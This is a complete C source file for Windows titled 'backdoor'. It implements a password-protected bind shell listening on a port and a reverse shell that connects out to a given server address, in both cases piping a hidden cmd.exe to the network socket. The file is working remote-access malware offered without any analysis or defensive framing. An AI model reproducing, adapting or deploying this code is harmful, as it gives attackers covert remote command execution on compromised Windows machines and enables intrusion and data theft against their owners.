#include "backdoor.h"

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib,"ws2_32.lib")

#define SOCK_BUFF_SIZE 2048

static char gl_Username[50];
static char gl_Password[50];

typedef struct
{
	SOCKET soc;
	struct sockaddr_in addr;
	void *param;
}THREAD_PARAM;

int conn_auth(SOCKET soc)
{
	char recvBuff[1024];
	char username[sizeof(gl_Username)];
	char password[sizeof(gl_Password)];
	int recvLen = 0;
	int totalRecvLen = 0;

	memset(username, 0x00, sizeof(username));
	memset(password, 0x00, sizeof(password));

	send(soc, "Username: ", strlen("Username: "), 0);
	while (1)
	{
		memset(recvBuff, 0x00, sizeof(recvBuff));
		recvLen = recv(soc, recvBuff, sizeof(recvBuff)-1, 0);
		totalRecvLen += recvLen;
		if (totalRecvLen >= sizeof(username))
			return 0;
		strcat(username, recvBuff);

		if (username[strlen(username) - 1] == '\n')
		{
			while (username[strlen(username) - 1] == '\n' || username[strlen(username) - 1] == '\r')
			{
				username[strlen(username) - 1] = NULL;
			}
			break;
		}
	}

	send(soc, "Password: ", strlen("Password: "), 0);
	while (1)
	{
		memset(recvBuff, 0x00, sizeof(recvBuff));
		recvLen = recv(soc, recvBuff, sizeof(recvBuff)-1, 0);
		totalRecvLen += recvLen;
		if (totalRecvLen >= sizeof(password))
			return 0;
		strcat(password, recvBuff);

		if (password[strlen(password) - 1] == '\n')
		{
			while (password[strlen(password) - 1] == '\n' || password[strlen(password) - 1] == '\r')
			{
				password[strlen(password) - 1] = NULL;
			}
			break;
		}
	}

	if (strcmp(gl_Username, username) != 0 || strcmp(gl_Password, password) != 0)
		return 0;

	return 1;
}

enum _bind_cmd_ret_
{
	BIND_CMD_NORMAL = 0,
	BIND_CMD_ERR_CREATE_PIPE,
	BIND_CMD_ERR_RECV,
	BIND_CMD_ERR_SEND,
	BIND_CMD_ERR_WR_PIPE,
	BIND_CMD_ERR_RD_PIPE,
};
int bind_cmd_proc(SOCKET soc)
{
	HANDLE hReadPipe1, hWritePipe1, hReadPipe2, hWritePipe2;       //两个匿名管道
	SECURITY_ATTRIBUTES sa;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	fd_set rdSet, wrSet;
	struct timeval timeoVal;
	char sendBuff[SOCK_BUFF_SIZE];
	char recvBuff[SOCK_BUFF_SIZE];
	int recvLen = 0;
	unsigned long lBytesRead = 0;

	memset(&si, NULL, sizeof(STARTUPINFO));
	memset(&sa, NULL, sizeof(SECURITY_ATTRIBUTES));
	memset(&pi, NULL, sizeof(PROCESS_INFORMATION));

	//创建两个匿名管道
	sa.nLength = sizeof(sa);
	sa.lpSecurityDescriptor = 0;
	sa.bInheritHandle = TRUE;
	if (!CreatePipe(&hReadPipe1, &hWritePipe1, &sa, 0))
		return BIND_CMD_ERR_CREATE_PIPE;
	if (!CreatePipe(&hReadPipe2, &hWritePipe2, &sa, 0))
		return BIND_CMD_ERR_CREATE_PIPE;

	//用管道与cmd.exe绑定
	GetStartupInfo(&si);
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = hReadPipe1;
	si.hStdOutput = si.hStdError = hWritePipe2;
	CreateProcess(NULL, (LPSTR)"cmd.exe", NULL, NULL, 1, NULL, NULL, NULL, &si, &pi);

	//roll select
	while (1)
	{
		timeoVal.tv_sec = 0;
		timeoVal.tv_usec = 100;
		FD_ZERO(&rdSet);
		FD_ZERO(&wrSet);
		FD_SET(soc, &rdSet);
		memset(recvBuff, NULL, sizeof(recvBuff));
		memset(sendBuff, NULL, sizeof(sendBuff));

		if (select(-1, &rdSet, NULL, NULL, &timeoVal) > 0)
		{
			//recv from socket
			if (FD_ISSET(soc, &rdSet))
			{
				if ((recvLen = recv(soc, recvBuff, sizeof(recvBuff) - 1, 0)) <= 0)
				{
					closesocket(soc);
					TerminateProcess(pi.hProcess, -1);
					CloseHandle(pi.hProcess);
					CloseHandle(pi.hThread);
					CloseHandle(hReadPipe1);
					CloseHandle(hWritePipe1);
					CloseHandle(hReadPipe2);
					CloseHandle(hWritePipe2);
					return BIND_CMD_ERR_RECV;
				}

				//write to pipe
				if (!WriteFile(hWritePipe1, recvBuff, strlen(recvBuff), &lBytesRead, 0))
				{
					closesocket(soc);
					TerminateProcess(pi.hProcess, -1);
					CloseHandle(pi.hProcess);
					CloseHandle(pi.hThread);
					CloseHandle(hReadPipe1);
					CloseHandle(hWritePipe1);
					CloseHandle(hReadPipe2);
					CloseHandle(hWritePipe2);
					return BIND_CMD_ERR_WR_PIPE;
				}
			}
		}
		else
		{
			if (PeekNamedPipe(hReadPipe2, recvBuff, sizeof(recvBuff) - 1, &lBytesRead, 0, 0) && lBytesRead > 0)
			{
				//read from cmd.exe
				if (!ReadFile(hReadPipe2, recvBuff, sizeof(recvBuff) - 1, &lBytesRead, 0))
				{
					closesocket(soc);
					TerminateProcess(pi.hProcess, -1);
					CloseHandle(pi.hProcess);
					CloseHandle(pi.hThread);
					CloseHandle(hReadPipe1);
					CloseHandle(hWritePipe1);
					CloseHandle(hReadPipe2);
					CloseHandle(hWritePipe2);
					return BIND_CMD_ERR_RD_PIPE;
				}

				if (send(soc, recvBuff, strlen(recvBuff), 0) <= 0)
				{
					closesocket(soc);
					TerminateProcess(pi.hProcess, -1);
					CloseHandle(pi.hProcess);
					CloseHandle(pi.hThread);
					CloseHandle(hReadPipe1);
					CloseHandle(hWritePipe1);
					CloseHandle(hReadPipe2);
					CloseHandle(hWritePipe2);
					return BIND_CMD_ERR_SEND;
				}
			}
		}
	}

	return BIND_CMD_NORMAL;
}

enum _client_conn_ret_
{
	CLI_CONN_NORMAL = 0,
	CLI_CONN_AUTH_FAILED,
};
DWORD WINAPI client_conn_thread(LPVOID Parameter)
{
	THREAD_PARAM *pParam = (THREAD_PARAM *)Parameter;

	if (conn_auth(pParam->soc) == 0)
	{
		closesocket(pParam->soc);
		free(pParam);
		return CLI_CONN_AUTH_FAILED;
	}

	bind_cmd_proc(pParam->soc);

	closesocket(pParam->soc);
	free(pParam);

	return CLI_CONN_NORMAL;
}

int new_conn_handler(SOCKET soc, struct sockaddr_in addr, void *param)
{
	HANDLE hThread;
	THREAD_PARAM *pThreadParam = NULL;

	pThreadParam = (THREAD_PARAM *)malloc(sizeof(THREAD_PARAM));
	if (pThreadParam == NULL)
		return 0;

	memset((char *)pThreadParam, 0x00, sizeof(THREAD_PARAM));
	pThreadParam->soc = soc;
	pThreadParam->addr = addr;
	pThreadParam->param = param;

	hThread = CreateThread(NULL, 0, client_conn_thread, (LPVOID)pThreadParam, 0, NULL);
	CloseHandle(hThread);

	return 0;
}

int init_socket()
{
	WSADATA wsa;

	memset((char *)&wsa, 0x00, sizeof(wsa));

	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
		return -1;

	return 0;
}

enum _listen_port_ret_
{
	LISTEN_NORMAL = 0,
	LISTEN_ERR_INIT,
	LISTEN_ERR_CREATE_SOC,
	LISTEN_ERR_BIND_ADDR,
	LISTEN_ERR_LISTEN_SOC,
};
int listen_port(unsigned short listenPort, int(*conn_handler)(SOCKET, struct sockaddr_in, void *), void *param)
{
	SOCKET listenSoc;
	SOCKET clientSoc;
	struct sockaddr_in localAddr;
	struct sockaddr_in clientAddr;
	int callbackRetVal = 0;
	int addrLen = 0;

	memset((char *)&localAddr, 0x00, sizeof(localAddr));

	localAddr.sin_family = AF_INET;
	localAddr.sin_addr.s_addr = INADDR_ANY;
	localAddr.sin_port = htons(listenPort);

	if (init_socket() != 0)
		return LISTEN_ERR_INIT;

	if ((listenSoc = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
		return LISTEN_ERR_CREATE_SOC;

	if (bind(listenSoc, (struct sockaddr *)&localAddr, sizeof(localAddr)) != 0)
		return LISTEN_ERR_BIND_ADDR;

	if (listen(listenSoc, SOMAXCONN) != 0)
		return LISTEN_ERR_LISTEN_SOC;

	while (callbackRetVal == 0)
	{
		memset((char *)&clientAddr, 0x00, sizeof(clientAddr));
		addrLen = sizeof(clientAddr);
		clientSoc = accept(listenSoc, (struct sockaddr *)&clientAddr, &addrLen);
		if (clientSoc == INVALID_SOCKET)
			continue;

		callbackRetVal = conn_handler(clientSoc, clientAddr, param);
	}

	return callbackRetVal;
}

enum _conn_back_ret_
{
	CONN_BACK_NORMAL = 0,
	CONN_BACK_ERR_INIT,
	CONN_BACK_ERR_CREATE_SOC,
	CONN_BACK_ERR_CONN,
};
int conn_back_to_server(char *servIP, unsigned short servPort)
{
    int retVal;
	SOCKET soc;
	struct sockaddr_in servAddr;

	memset((char *)&servAddr, 0x00, sizeof(servAddr));

	servAddr.sin_family = AF_INET;
	servAddr.sin_addr.s_addr = inet_addr(servIP);
	servAddr.sin_port = htons(servPort);

	if (init_socket() != 0)
		return CONN_BACK_ERR_INIT;

	if ((soc = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
		return CONN_BACK_ERR_CREATE_SOC;

	if (connect(soc, (struct sockaddr *)&servAddr, sizeof(servAddr)) != 0)
		return CONN_BACK_ERR_CONN;

	retVal = bind_cmd_proc(soc);

	return retVal;
}

int start_service(char *usr, char *pwd, unsigned short listenPort)
{
    int retVal;

	memset(gl_Username, 0x00, sizeof(gl_Username));
	memset(gl_Password, 0x00, sizeof(gl_Password));

	strcat(gl_Username, usr);
	strcat(gl_Password, pwd);

	retVal = listen_port(listenPort, new_conn_handler, NULL);

	return retVal;
}
